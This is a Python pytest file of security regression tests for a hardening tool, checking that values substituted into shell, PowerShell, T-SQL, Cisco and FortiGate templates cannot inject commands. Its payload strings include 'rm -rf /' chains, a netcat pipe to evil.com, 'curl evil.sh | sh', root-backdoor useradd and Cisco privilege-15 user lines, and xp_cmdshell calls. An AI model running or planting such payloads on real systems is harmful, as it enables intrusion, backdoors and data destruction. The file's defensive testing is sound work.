"""
Security regression tests for checklist item 1.1: command/SQL/PowerShell
injection via hardening parameter substitution.

Covers:
- The shared primitives in app.core.hardening_param_security directly.
- An injection-payload matrix run through each of the seven hardening
  modules' actual substitution entry point, proving a malicious value can
  never reach the built command/script/SQL statement unescaped.
- Legitimate-value regression checks (multi-line banners, cipher-suite
  strings, space-separated user lists, etc.) proving the fix does not
  reject real, expected input.

No SSH/WinRM/DB connection is made anywhere in this file — every check
operates on the pure template/substitution/validation layer.
"""

import shlex

import pytest

from app.core.hardening_param_security import (
    ParameterSecurityError,
    escape_powershell_single_quoted,
    escape_sql_identifier_text,
    quote_shell,
    reject_shell_breakout_chars,
    validate_cli_line,
    validate_delimited_text,
    validate_heredoc_body,
    validate_host_list,
    validate_identifier,
    validate_integer,
    validate_path,
    validate_select,
)


# =========================================================================
# Shared primitives
# =========================================================================

class TestHeredocBody:
    def test_legitimate_multiline_banner_is_preserved_verbatim(self):
        text = "Authorized users only.\nAll activity is monitored and logged.\n(555) 123-4567"
        assert validate_heredoc_body(text, "BANNER_TEXT") == text

    def test_bare_delimiter_line_is_rejected(self):
        payload = "hello\nEOF\nrm -rf / #"
        with pytest.raises(ParameterSecurityError):
            validate_heredoc_body(payload, "MOTD_TEXT", delimiter="EOF")

    def test_delimiter_line_with_surrounding_whitespace_is_rejected(self):
        payload = "hello\n   EOF   \nmalicious next line"
        with pytest.raises(ParameterSecurityError):
            validate_heredoc_body(payload, "MOTD_TEXT", delimiter="EOF")

    def test_delimiter_as_a_substring_not_a_whole_line_is_allowed(self):
        # "EOFFOO" and "prefix EOF suffix" are not a *line* equal to EOF.
        text = "Please see EOF-handling docs before EOF suffix text"
        assert validate_heredoc_body(text, "MOTD_TEXT") == text

    def test_nul_byte_is_rejected(self):
        with pytest.raises(ParameterSecurityError):
            validate_heredoc_body("hello\x00world", "MOTD_TEXT")


class TestDelimitedText:
    def test_legitimate_multiline_value_with_no_delimiter_is_preserved(self):
        text = "Authorized users only.\nAll activity is monitored."
        assert validate_delimited_text(text, "BANNER_TEXT", delimiter="^") == text

    def test_embedded_delimiter_character_is_rejected(self):
        payload = "hi ^ config system admin\nedit evil\nnext"
        with pytest.raises(ParameterSecurityError):
            validate_delimited_text(payload, "BANNER_TEXT", delimiter="^")


class TestCliLine:
    def test_ordinary_password_with_punctuation_is_preserved(self):
        # Cisco/FortiOS CLIs have no shell semantics: punctuation in a
        # password must survive untouched.
        value = "MySecureSecret123!$#@"
        assert validate_cli_line(value, "STRONG_SECRET") == value

    @pytest.mark.parametrize("payload", [
        "good\nusername backdoor privilege 15 secret x",
        "good\rmalicious",
        "bad\x00value",
    ])
    def test_embedded_newline_or_control_char_is_rejected(self, payload):
        with pytest.raises(ParameterSecurityError):
            validate_cli_line(payload, "HOSTNAME")

    def test_overlong_value_is_rejected(self):
        with pytest.raises(ParameterSecurityError):
            validate_cli_line("a" * 2000, "HOSTNAME", max_length=1024)


class TestShellBreakoutChars:
    def test_cipher_suite_style_value_is_preserved(self):
        value = "ECDHE-ECDSA-AES128-GCM-SHA256:!aNULL:!eNULL:!EXP:!LOW"
        assert reject_shell_breakout_chars(value, "SSL_CIPHER_SUITE") == value

    def test_pipe_separated_extension_list_is_preserved(self):
        value = "bak|old|orig|save|inc|sql|ini|log|sh"
        assert reject_shell_breakout_chars(value, "RESTRICTED_EXTENSIONS") == value

    @pytest.mark.parametrize("payload", [
        "/tmp/x' ; rm -rf / #",
        "value`id`",
        "value$(whoami)",
        "value\\; evil",
        "line1\nline2",
        "value\rwith\rcr",
        "value;rm -rf /",
    ])
    def test_shell_breakout_payload_is_rejected(self, payload):
        with pytest.raises(ParameterSecurityError):
            reject_shell_breakout_chars(payload, "SOME_PARAM")


class TestPathIdentifierHostAllowlists:
    def test_legitimate_path_is_preserved(self):
        assert validate_path("/etc/ssl/mongodb/mongod.pem", "TLS_CERT_FILE") == \
            "/etc/ssl/mongodb/mongod.pem"

    @pytest.mark.parametrize("payload", [
        "/tmp/x' ; rm -rf / #",
        "/tmp/x && rm -rf /",
        "/tmp/`whoami`",
        "/tmp/$(whoami)",
        "/tmp/x | nc evil.com 4444",
        "/tmp/x\nrm -rf /",
        "/tmp/x y",  # space — not a legitimate path char here either
    ])
    def test_malicious_or_malformed_path_is_rejected(self, payload):
        with pytest.raises(ParameterSecurityError):
            validate_path(payload, "KEYFILE_PATH")

    def test_legitimate_identifier_is_preserved(self):
        assert validate_identifier("mongod", "MONGO_SERVICE_USER") == "mongod"

    def test_identifier_with_shell_metachar_is_rejected(self):
        with pytest.raises(ParameterSecurityError):
            validate_identifier("mongod; rm -rf /", "MONGO_SERVICE_USER")

    def test_legitimate_host_list_is_preserved(self):
        assert validate_host_list("127.0.0.1,10.0.0.5", "MONGO_BIND_IP") == "127.0.0.1,10.0.0.5"

    def test_host_list_with_shell_metachar_is_rejected(self):
        with pytest.raises(ParameterSecurityError):
            validate_host_list("127.0.0.1`id`", "MONGO_BIND_IP")


class TestPowershellSingleQuoted:
    def test_legitimate_username_is_preserved(self):
        assert escape_powershell_single_quoted("svc-backup", "NEW_ADMIN_NAME") == "svc-backup"

    def test_embedded_single_quote_is_doubled_not_a_breakout(self):
        escaped = escape_powershell_single_quoted("O'Brien", "NEW_ADMIN_NAME")
        assert escaped == "O''Brien"
        # Reconstructing the PowerShell literal this becomes must contain no
        # unescaped single quote in the middle of the string.
        literal = f"'{escaped}'"
        inner = literal[1:-1]
        assert "''" in inner

    @pytest.mark.parametrize("payload", [
        "evil\nInvoke-Expression evil",
        "evil\rInvoke-Expression evil",
        "evil\x00name",
    ])
    def test_control_chars_are_rejected(self, payload):
        with pytest.raises(ParameterSecurityError):
            escape_powershell_single_quoted(payload, "NEW_ADMIN_NAME")


class TestSqlIdentifierText:
    def test_legitimate_login_name_is_preserved(self):
        assert escape_sql_identifier_text("appuser", "LOGIN_NAME") == "appuser"

    @pytest.mark.parametrize("payload", [
        "x'; DROP TABLE users--",
        "x] ; DROP LOGIN [sa",
        "x]",
        "x'",
        "line1\nline2",
        "x -- comment",
    ])
    def test_breakout_payload_is_rejected(self, payload):
        with pytest.raises(ParameterSecurityError):
            escape_sql_identifier_text(payload, "DB_NAME")


class TestIntegerAndSelect:
    def test_valid_integer_round_trips(self):
        assert validate_integer("42", "TIMEOUT_MIN") == "42"

    def test_non_numeric_is_rejected(self):
        with pytest.raises(ParameterSecurityError):
            validate_integer("42; rm -rf /", "TIMEOUT_MIN")

    def test_out_of_range_is_rejected_when_bounds_given(self):
        with pytest.raises(ParameterSecurityError):
            validate_integer("999", "TIMEOUT_MIN", min_value=1, max_value=60)

    def test_select_enforces_membership(self):
        assert validate_select("DENY", "X_FRAME_OPTIONS", ["SAMEORIGIN", "DENY"]) == "DENY"
        with pytest.raises(ParameterSecurityError):
            validate_select("evil", "X_FRAME_OPTIONS", ["SAMEORIGIN", "DENY"])


# =========================================================================
# Per-module injection matrix — the actual substitution entry points
# =========================================================================

# A generic payload matrix aimed at every class of injection this item
# closes: shell breakout, command chaining, subshell, delimiter collision,
# line injection over an interactive CLI/heredoc.
GENERIC_SHELL_PAYLOADS = [
    "x' ; rm -rf / #",
    "x`id`",
    "x$(id)",
    "x\\; id",
    "x\nrm -rf /",
]


class TestLinuxInjection:
    """app.modules.linux.hardening.command_templates"""

    def test_heredoc_delimiter_collision_is_rejected_for_motd(self):
        from app.modules.linux.hardening.command_templates import (
            get_linux_template_commands_for_distro,
        )
        payload = "hello\nEOF\nrm -rf / #"
        with pytest.raises(ParameterSecurityError):
            get_linux_template_commands_for_distro(
                "LNX-L1-1.6.1", "ubuntu", {"MOTD_TEXT": payload}
            )

    def test_heredoc_delimiter_collision_is_rejected_for_ssh_banner(self):
        """Regression: SSH_BANNER_TEXT (LNX-L1-5.2.14) used the same heredoc
        pattern as MOTD_TEXT/BANNER_TEXT but was missing from _HEREDOC_PARAMS,
        so it was shell-quoted (corrupting legitimate banners) while still
        being vulnerable to delimiter collision (shlex.quote only wraps the
        *whole* multi-line value in quotes at its start/end, not per line —
        an embedded bare "EOF" line is untouched by that quoting and still
        terminates the heredoc early)."""
        from app.modules.linux.hardening.command_templates import (
            get_linux_template_commands_for_distro,
        )
        payload = "Authorized use only.\nEOF\nuseradd -o -u 0 backdoor"
        with pytest.raises(ParameterSecurityError):
            get_linux_template_commands_for_distro(
                "LNX-L1-5.2.14", "ubuntu", {"SSH_BANNER_TEXT": payload}
            )

    def test_legitimate_multiline_ssh_banner_is_inserted_literally(self):
        from app.modules.linux.hardening.command_templates import (
            get_linux_template_commands_for_distro,
        )
        text = "Authorized access only.\nAll activity is monitored and logged."
        commands = get_linux_template_commands_for_distro(
            "LNX-L1-5.2.14", "ubuntu", {"SSH_BANNER_TEXT": text}
        )
        joined = "\n".join(commands)
        assert text in joined
        # And it must NOT have been shell-quoted (no stray leading/trailing
        # quote characters wrapped around the banner body).
        assert "'Authorized access only." not in joined

    def test_legitimate_multiline_motd_is_inserted_literally(self):
        from app.modules.linux.hardening.command_templates import (
            get_linux_template_commands_for_distro,
        )
        text = "Welcome.\nUnauthorized access is prohibited."
        commands = get_linux_template_commands_for_distro(
            "LNX-L1-1.6.1", "ubuntu", {"MOTD_TEXT": text}
        )
        assert text in "\n".join(commands)

    def test_multiword_ssh_user_list_still_shell_quotes_correctly(self):
        """Pre-existing, correct behavior (ALLOWED_SSH_USERS is not a
        heredoc param) — must keep working unchanged."""
        from app.modules.linux.hardening.command_templates import (
            get_linux_template_commands_for_distro,
        )
        commands = get_linux_template_commands_for_distro(
            "LNX-L1-5.2.15", "ubuntu",
            {"ALLOWED_SSH_USERS": "admin deploy operator", "ALLOWED_SSH_GROUPS": ""},
        )
        joined = "\n".join(commands)
        assert "admin deploy operator" in joined

    def test_shell_metacharacters_in_a_non_heredoc_param_do_not_break_out(self):
        """Non-heredoc params go through shlex.quote(): a malicious value is
        neutralized (wrapped as one shell token), not rejected outright —
        confirm it can never split into extra shell words."""
        from app.modules.linux.hardening.command_templates import (
            get_linux_template_commands_for_distro,
        )
        payload = "x' ; rm -rf / #"
        commands = get_linux_template_commands_for_distro(
            "LNX-L1-5.2.15", "ubuntu",
            {"ALLOWED_SSH_USERS": payload, "ALLOWED_SSH_GROUPS": ""},
        )
        for cmd in commands:
            if payload.split("'")[0] not in cmd:
                continue
            # The substituted command must parse back as shell-safe: no
            # unescaped ';' able to start a second command. shlex can parse
            # the whole line without the payload's ';' being a real
            # statement separator (shlex doesn't split on ';' at all, so we
            # instead assert the raw quoted form is present verbatim).
            assert shlex.quote(payload) in cmd


class TestMongoDBInjection:
    """app.modules.mongodb.hardening.command_templates"""

    @pytest.mark.parametrize("payload", GENERIC_SHELL_PAYLOADS)
    def test_keyfile_path_rejects_shell_breakout(self, payload):
        from app.modules.mongodb.hardening.command_templates import (
            get_mongodb_template_commands,
        )
        with pytest.raises(ParameterSecurityError):
            get_mongodb_template_commands("MONGO-L1-004", {"KEYFILE_PATH": payload})

    @pytest.mark.parametrize("payload", [
        "mongod; rm -rf /",
        "mongod`id`",
        "mongod$(id)",
        "mongod && curl evil.sh | sh",
    ])
    def test_service_user_rejects_shell_breakout(self, payload):
        from app.modules.mongodb.hardening.command_templates import (
            get_mongodb_template_commands,
        )
        with pytest.raises(ParameterSecurityError):
            get_mongodb_template_commands("MONGO-L1-008", {"MONGO_SERVICE_USER": payload})

    def test_audit_filter_embedded_single_quote_does_not_break_out_of_the_shell(self):
        """
        AUDIT_FILTER sits inside a single-quoted `sed ... a\\` shell
        argument, but its documented, legitimate format (parameter_metadata.py:
        "single quotes only") *requires* embedded single quotes around each
        JSON string — so this parameter escapes rather than rejects them
        (see escape_single_quoted_shell_literal). Prove the escaping is
        actually correct by handing the real generated command to a real
        POSIX shell and confirming an attacker-chosen command embedded after
        a raw "'" never executes.
        """
        import subprocess
        import tempfile
        import os

        from app.modules.mongodb.hardening.command_templates import (
            get_mongodb_template_commands,
        )

        with tempfile.TemporaryDirectory() as tmp:
            marker = os.path.join(tmp, "pwned")
            conf = os.path.join(tmp, "mongod.conf")
            with open(conf, "w") as f:
                f.write("auditLog:\n  destination: file\n")

            payload = f"{{ atype: 1 }}' ; touch {marker} ; echo '"
            commands = get_mongodb_template_commands(
                "MONGO-L2-016", {"AUDIT_FILTER": payload}
            )
            # Run the real generated commands (minus the systemctl restart,
            # which needs a live service) against the temp conf file.
            for cmd in commands:
                if "systemctl" in cmd or "service mongod" in cmd:
                    continue
                cmd = cmd.replace("/etc/mongod.conf", conf)
                subprocess.run(["sh", "-c", cmd], check=False,
                                capture_output=True, text=True)

            assert not os.path.exists(marker), (
                "AUDIT_FILTER escaping failed to neutralize an embedded "
                "single quote — the injected `touch` command executed"
            )

    def test_legitimate_audit_filter_with_documented_single_quote_syntax_round_trips(self):
        """The module's own documented default value format — single-quoted
        JSON strings — must keep working after escaping."""
        from app.modules.mongodb.hardening.command_templates import (
            get_mongodb_template_commands,
        )
        value = "{ atype: { $in: [ 'authenticate', 'createUser' ] } }"
        commands = get_mongodb_template_commands("MONGO-L2-016", {"AUDIT_FILTER": value})
        assert any("atype" in c and "$in" in c for c in commands)

    def test_legitimate_keyfile_path_substitutes_cleanly(self):
        from app.modules.mongodb.hardening.command_templates import (
            get_mongodb_template_commands,
        )
        commands = get_mongodb_template_commands(
            "MONGO-L1-004", {"KEYFILE_PATH": "/etc/mongodb/keyfile"}
        )
        assert any("/etc/mongodb/keyfile" in c for c in commands)

    def test_port_must_be_numeric(self):
        from app.modules.mongodb.hardening.command_templates import (
            get_mongodb_template_commands,
        )
        with pytest.raises(ParameterSecurityError):
            get_mongodb_template_commands("MONGO-L2-020", {"MONGO_PORT": "27017; rm -rf /"})


class TestApacheInjection:
    """app.modules.apache.hardening.command_templates"""

    @pytest.mark.parametrize("payload", GENERIC_SHELL_PAYLOADS)
    def test_ssl_cert_file_rejects_shell_breakout(self, payload):
        from app.modules.apache.hardening.command_templates import (
            get_apache_template_commands_for_distro,
        )
        with pytest.raises(ParameterSecurityError):
            get_apache_template_commands_for_distro(
                "APACHE-L1-7.2", "ubuntu", {"SSL_CERT_FILE": payload, "SSL_KEY_FILE": "/etc/ssl/private/server.key"}
            )

    def test_cipher_suite_rejects_single_quote_breakout(self):
        from app.modules.apache.hardening.command_templates import (
            get_apache_template_commands_for_distro,
        )
        payload = "HIGH' ; rm -rf / #"
        with pytest.raises(ParameterSecurityError):
            get_apache_template_commands_for_distro(
                "APACHE-L1-7.5", "ubuntu", {"SSL_CIPHER_SUITE": payload}
            )

    def test_legitimate_cipher_suite_string_is_preserved(self):
        from app.modules.apache.hardening.command_templates import (
            get_apache_template_commands_for_distro,
        )
        value = "ECDHE-ECDSA-AES128-GCM-SHA256:!aNULL:!eNULL:!EXP:!LOW"
        commands = get_apache_template_commands_for_distro(
            "APACHE-L1-7.5", "ubuntu", {"SSL_CIPHER_SUITE": value}
        )
        assert any(value in c for c in commands)

    def test_legitimate_extension_list_is_preserved(self):
        from app.modules.apache.hardening.command_templates import (
            get_apache_template_commands_for_distro,
        )
        value = "bak|old|orig|save|inc|sql|ini|log|sh"
        commands = get_apache_template_commands_for_distro(
            "APACHE-L1-5.11", "ubuntu", {"RESTRICTED_EXTENSIONS": value}
        )
        assert any(value in c for c in commands)

    def test_x_frame_options_enforces_enum(self):
        from app.modules.apache.hardening.command_templates import (
            get_apache_template_commands_for_distro,
        )
        with pytest.raises(ParameterSecurityError):
            get_apache_template_commands_for_distro(
                "APACHE-L1-5.14", "ubuntu", {"X_FRAME_OPTIONS": "evil\" ; rm -rf / #"}
            )

    def test_listen_ip_rejects_shell_breakout(self):
        from app.modules.apache.hardening.command_templates import (
            get_apache_template_commands_for_distro,
        )
        with pytest.raises(ParameterSecurityError):
            get_apache_template_commands_for_distro(
                "APACHE-L2-5.13", "ubuntu", {"LISTEN_IP": "10.0.0.5`id`"}
            )


class TestCiscoInjection:
    """app.modules.cisco.hardening.command_parser.RemediationParser"""

    def test_enable_secret_rejects_newline_injection(self):
        from app.modules.cisco.hardening.command_parser import RemediationParser
        payload = "goodpass\nusername backdoor privilege 15 secret x\nend"
        with pytest.raises(ParameterSecurityError):
            RemediationParser.substitute_parameters(
                ["enable secret {STRONG_SECRET}"], {"STRONG_SECRET": payload}
            )

    def test_enable_secret_with_punctuation_is_preserved(self):
        from app.modules.cisco.hardening.command_parser import RemediationParser
        value = "MySecureSecret123!$#@"
        result = RemediationParser.substitute_parameters(
            ["enable secret {STRONG_SECRET}"], {"STRONG_SECRET": value}
        )
        assert result == [f"enable secret {value}"]

    def test_banner_rejects_embedded_delimiter(self):
        """banner motd ^{BANNER_TEXT}^ uses '^' as its delimiter; an
        embedded '^' closes the banner definition early."""
        from app.modules.cisco.hardening.command_parser import RemediationParser
        payload = "Authorized use only ^ conf t ^ username evil privilege 15"
        with pytest.raises(ParameterSecurityError):
            RemediationParser.substitute_parameters(
                ["banner motd ^{BANNER_TEXT}^"], {"BANNER_TEXT": payload}
            )

    def test_banner_allows_legitimate_embedded_newlines(self):
        """Embedded newlines alone are NOT rejected for a Cisco banner: the
        device genuinely expects multi-line banner text (sent as multiple
        physical lines, exactly like Linux's heredoc banners) up until the
        closing '^' delimiter. Only an embedded '^' (tested above) actually
        lets a line be interpreted as a fresh CLI command early."""
        from app.modules.cisco.hardening.command_parser import RemediationParser
        text = "Authorized users only.\nAll activity is monitored and logged."
        result = RemediationParser.substitute_parameters(
            ["banner login ^{BANNER_TEXT}^"], {"BANNER_TEXT": text}
        )
        assert result == [f"banner login ^{text}^"]

    def test_hostname_rejects_newline_injection(self):
        from app.modules.cisco.hardening.command_parser import RemediationParser
        payload = "router1\nusername evil privilege 15 secret x"
        with pytest.raises(ParameterSecurityError):
            RemediationParser.substitute_parameters(
                ["hostname {HOSTNAME}"], {"HOSTNAME": payload}
            )

    def test_legitimate_single_line_banner_still_works(self):
        from app.modules.cisco.hardening.command_parser import RemediationParser
        value = "Authorized users only. All activity is monitored and logged."
        result = RemediationParser.substitute_parameters(
            ["banner motd ^{BANNER_TEXT}^"], {"BANNER_TEXT": value}
        )
        assert result == [f"banner motd ^{value}^"]

    def test_full_template_substitution_still_satisfies_existing_test_defaults(self):
        """Locks in that legitimate template defaults (exercised by
        test_cisco_hardening_params.py) keep substituting cleanly after this
        change."""
        from app.modules.cisco.hardening.command_parser import RemediationParser
        result = RemediationParser.substitute_parameters(
            ["ntp server {NTP_SERVER}"], {"NTP_SERVER": "192.168.1.10"}
        )
        assert result == ["ntp server 192.168.1.10"]


class TestFortinetInjection:
    """app.modules.fortinet.hardening.command_parser.FortiGateRemediationParser"""

    def test_hostname_rejects_newline_injection(self):
        from app.modules.fortinet.hardening.command_parser import FortiGateRemediationParser
        payload = "fgt-hq-01\nconfig system admin\nedit evil"
        with pytest.raises(ParameterSecurityError):
            FortiGateRemediationParser.substitute_parameters(
                ["set hostname {HOSTNAME}"], {"HOSTNAME": payload}
            )

    def test_admin_timeout_rejects_non_numeric(self):
        from app.modules.fortinet.hardening.command_parser import FortiGateRemediationParser
        with pytest.raises(ParameterSecurityError):
            FortiGateRemediationParser.substitute_parameters(
                ["set admintimeout {ADMIN_TIMEOUT}"], {"ADMIN_TIMEOUT": "10\nnext-line evil"}
            )

    def test_legitimate_hostname_still_works(self):
        from app.modules.fortinet.hardening.command_parser import FortiGateRemediationParser
        result = FortiGateRemediationParser.substitute_parameters(
            ["set hostname {HOSTNAME}"], {"HOSTNAME": "fgt-hq-01"}
        )
        assert result == ["set hostname fgt-hq-01"]

    def test_legitimate_numeric_timeout_still_works(self):
        from app.modules.fortinet.hardening.command_parser import FortiGateRemediationParser
        result = FortiGateRemediationParser.substitute_parameters(
            ["set admintimeout {ADMIN_TIMEOUT}"], {"ADMIN_TIMEOUT": "10"}
        )
        assert result == ["set admintimeout 10"]


class TestMssqlInjectionExistingProtection:
    """
    MSSQL already validates parameters (tsql_executor._validate_mssql_parameters)
    before execute_hardening() builds/runs any T-SQL — this locks that
    pre-existing protection in as a regression test rather than re-inventing
    it, per the audit's finding that MSSQL's real execution sink was already
    guarded.
    """

    @pytest.mark.parametrize("payload", [
        "sqladmin'; DROP LOGIN [sa]; --",
        "sqladmin]; DROP LOGIN [sa",
        "sqladmin\nEXEC xp_cmdshell 'whoami'",
    ])
    def test_new_sa_name_rejects_breakout(self, payload):
        from app.modules.mssql.hardening.tsql_executor import _validate_mssql_parameters
        error = _validate_mssql_parameters({"NEW_SA_NAME": payload})
        assert error is not None

    def test_legitimate_new_sa_name_is_accepted(self):
        from app.modules.mssql.hardening.tsql_executor import _validate_mssql_parameters
        assert _validate_mssql_parameters({"NEW_SA_NAME": "sqladmin"}) is None

    def test_num_error_logs_must_be_numeric(self):
        from app.modules.mssql.hardening.tsql_executor import _validate_mssql_parameters
        error = _validate_mssql_parameters({"NUM_ERROR_LOGS": "12; DROP TABLE x"})
        assert error is not None


class TestWindowsInjectionExistingProtection:
    """
    Windows already validates parameters (winrm_executor._validate_windows_parameters)
    before execute_hardening() runs any PowerShell — this locks that
    pre-existing protection in as a regression test.
    """

    @pytest.mark.parametrize("payload", [
        "evil'; Invoke-Expression 'evil' #",
        "evil`; Invoke-Expression 'evil'",
        "evil\nInvoke-Expression evil",
    ])
    def test_new_admin_name_rejects_breakout(self, payload):
        from app.modules.windows.hardening.winrm_executor import _validate_windows_parameters
        error = _validate_windows_parameters({"NEW_ADMIN_NAME": payload})
        assert error is not None

    def test_legitimate_new_admin_name_is_accepted(self):
        from app.modules.windows.hardening.winrm_executor import _validate_windows_parameters
        assert _validate_windows_parameters({"NEW_ADMIN_NAME": "svc-admin"}) is None

    def test_max_password_age_must_be_numeric(self):
        from app.modules.windows.hardening.winrm_executor import _validate_windows_parameters
        error = _validate_windows_parameters({"MAX_PASSWORD_AGE": "60; Remove-Item C:\\ -Recurse"})
        assert error is not None
